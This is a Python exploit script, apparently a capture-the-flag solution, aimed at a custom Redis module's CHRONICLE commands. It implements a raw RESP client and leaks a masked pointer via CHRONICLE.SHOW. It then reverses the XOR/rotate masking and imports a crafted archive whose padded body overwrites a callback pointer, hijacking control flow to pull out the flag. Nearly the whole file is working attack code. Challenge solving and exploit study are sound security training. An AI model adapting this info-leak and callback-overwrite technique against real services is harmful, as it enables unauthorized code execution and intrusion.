#!/usr/bin/env python3
import re
import socket
import struct
import sys
import time


HOST = sys.argv[1] if len(sys.argv) > 1 else "chal.thjcc.org"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 6379
MASK64 = (1 << 64) - 1
MATERIALIZE_DELTA = 0xD0


class Redis:
    def __init__(self, host, port):
        error = None
        for family, socktype, proto, _, address in socket.getaddrinfo(
            host, port, type=socket.SOCK_STREAM
        ):
            sock = socket.socket(family, socktype, proto)
            sock.settimeout(5)
            try:
                sock.connect(address)
                self.sock = sock
                self.buffer = bytearray()
                return
            except OSError as exc:
                error = exc
                sock.close()
        raise error or ConnectionError("could not resolve Redis endpoint")

    def _readline(self):
        while True:
            newline = self.buffer.find(b"\r\n")
            if newline >= 0:
                line = bytes(self.buffer[:newline])
                del self.buffer[: newline + 2]
                return line
            chunk = self.sock.recv(4096)
            if not chunk:
                raise EOFError("Redis closed the connection")
            self.buffer.extend(chunk)

    def _read_exact(self, length):
        while len(self.buffer) < length:
            chunk = self.sock.recv(4096)
            if not chunk:
                raise EOFError("Redis closed the connection")
            self.buffer.extend(chunk)
        data = bytes(self.buffer[:length])
        del self.buffer[:length]
        return data

    def _reply(self):
        prefix = self._read_exact(1)
        if prefix == b"+":
            return self._readline()
        if prefix == b"-":
            raise RuntimeError(self._readline().decode("utf-8", "replace"))
        if prefix == b":":
            return int(self._readline())
        if prefix == b"$":
            length = int(self._readline())
            if length == -1:
                return None
            data = self._read_exact(length)
            if self._read_exact(2) != b"\r\n":
                raise ValueError("malformed bulk reply")
            return data
        if prefix == b"*":
            length = int(self._readline())
            return None if length == -1 else [self._reply() for _ in range(length)]
        raise ValueError(f"unknown RESP prefix: {prefix!r}")

    def command(self, *parts):
        encoded = []
        for part in parts:
            if isinstance(part, bytes):
                encoded.append(part)
            else:
                encoded.append(str(part).encode())
        request = [f"*{len(encoded)}\r\n".encode()]
        for part in encoded:
            request.extend((f"${len(part)}\r\n".encode(), part, b"\r\n"))
        self.sock.sendall(b"".join(request))
        return self._reply()


def rol64(value, amount):
    return ((value << amount) | (value >> (64 - amount))) & MASK64


def fnv1a32(data):
    value = 0x811C9DC5
    for byte in data:
        value = ((value ^ byte) * 0x01000193) & 0xFFFFFFFF
    return value


def encode_uvarint(value):
    encoded = bytearray()
    while True:
        byte = value & 0x7F
        value >>= 7
        encoded.append(byte | (0x80 if value else 0))
        if not value:
            return bytes(encoded)


def make_archive(callback):
    label = b"restore"
    body = b"A" * 80 + struct.pack("<Q", callback)
    body = body.ljust(256, b"B")

    archive = bytearray(b"CHRN\x01\x01\x00\x00")
    archive += struct.pack("<I", 10)
    archive += bytes([len(label)]) + label
    archive += encode_uvarint(len(body)) + body
    archive += struct.pack("<I", fnv1a32(archive))
    return bytes(archive)


def main():
    redis = Redis(HOST, PORT)
    if redis.command("PING") != b"PONG":
        raise RuntimeError("unexpected PING response")

    leak_id = redis.command(
        "CHRONICLE.NEW", 86400000, "address-leak", "chronicle"
    )
    leak = redis.command("CHRONICLE.SHOW", leak_id)
    ticket = leak[3] & MASK64
    salt = rol64((leak_id * 0x9E3779B97F4A7C15) & MASK64, 17)
    commit_annotation = ticket ^ salt
    materialize_anchor = (commit_annotation + MATERIALIZE_DELTA) & MASK64

    print(f"[+] leak task:          {leak_id}")
    print(f"[+] commit_annotation:  0x{commit_annotation:016x}")
    print(f"[+] materialize_anchor: 0x{materialize_anchor:016x}")

    exploit_id = redis.command("CHRONICLE.IMPORT", make_archive(materialize_anchor))
    time.sleep(0.15)
    result = redis.command("CHRONICLE.SHOW", exploit_id)
    print(f"[+] exploit task:       {exploit_id} ({result[1].decode()})")

    flag = re.search(rb"(?i:thjcc)\{[^}\r\n]+\}", result[5])
    if not flag:
        raise RuntimeError(f"flag not found in result: {result[5]!r}")
    print(flag.group().decode())


if __name__ == "__main__":
    main()
